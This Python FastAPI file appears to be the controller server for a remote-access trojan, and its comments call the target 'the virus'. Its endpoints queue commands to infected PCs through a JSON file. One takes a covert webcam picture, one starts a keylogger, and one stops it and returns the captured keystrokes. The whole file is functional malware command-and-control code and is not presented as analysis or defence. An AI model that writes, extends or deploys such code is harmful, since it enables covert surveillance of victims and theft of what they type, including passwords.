from typing import Optional

from fastapi import FastAPI, Request

import base64
from os import path
import os
import json
import time
from fastapi.responses import FileResponse
app = FastAPI()


# first commit from the client to get the pc name that the virus is in.
@app.get("/first_commit")
async def first_connection():

    with open("pc_name.txt", "r") as file_ptr:

        pc_name = file_ptr.read()

    # remove the pc name file to make the pc name secret.
    os.remove("pc_name.txt")

    return f"Your pc name is: >> {pc_name} <<"


# if the client wants to take a picture
@app.get("/{pc_name}/take_picture")
async def take_picture(pc_name: str):

    with open("DB.json", "r") as file_ptr:
        file = json.load(file_ptr) ## reading the json file

    ## add web cam command if not exists.
    if "WebCam" not in file[pc_name]["commands"]:
        file[pc_name]["commands"].append("WebCam")

    with open ("DB.json", "w") as file_ptr:
        json.dump(file, file_ptr)
    print("pro picture")
    # waiting for the photo to come back
    while True:
        #try:
       if path.exists(f"transferred_picture_{pc_name}.bmp"):
            try:
                # copying the picture content and removing the main picture.
                with open(f"transferred_picture_{pc_name}.bmp", "rb") as file_ptr:
                    with open("temp_picture.bmp", "wb") as temp_file_ptr:
                        temp_file_ptr.write(file_ptr.read())
                return FileResponse("temp_picture.bmp")
            finally:
                # remove the main picture.
                os.remove(f"transferred_picture_{pc_name}.bmp")


       time.sleep(5)  # sleep 5 seconds for other commands to come




# if the client wants to start the key logger function
@app.get("/{pc_name}/start_key_logger")
async def take_picture(pc_name: str):

    with open("DB.json", "r") as file_ptr:
        file = json.load(file_ptr) ## reading the json file

    ## add start key logger command if not exists.
    if "StartKeyLogger" not in file[pc_name]["commands"]:
        file[pc_name]["commands"].append("StartKeyLogger")

    with open ("DB.json", "w") as file_ptr:
        json.dump(file, file_ptr)

    return "Command added successfully! -> hf typing (:"



# if the client wants to stop the key logger function
@app.get("/{pc_name}/stop_key_logger")
async def take_picture(pc_name: str):

    with open("DB.json", "r") as file_ptr:
        file = json.load(file_ptr) ## reading the json file

    ## add stop key logger command if not exists.
    if "StopKeyLogger" not in file[pc_name]["commands"]:
        file[pc_name]["commands"].append("StopKeyLogger")

    with open ("DB.json", "w") as file_ptr:
        json.dump(file, file_ptr)

    # waiting for the key logger to come back
    while True:
        try:
            with open(f"transferred_key_logger_{pc_name}.txt") as file_ptr:
                print('founded key logger')
                data = file_ptr.read()
            #deleting the file taken
            os.remove(f"transferred_key_logger_{pc_name}.txt")
            return f"key logger taken: {data}"

        except:
            pass

        time.sleep(5)  # sleep 5 seconds for other commands to come


#### TODO this file is not needed!!!!!

if __name__ == '__main__':
    # starting the server
    #os.system("uvicorn App_FastAPI_Client:app --reload --port 7000")
    pass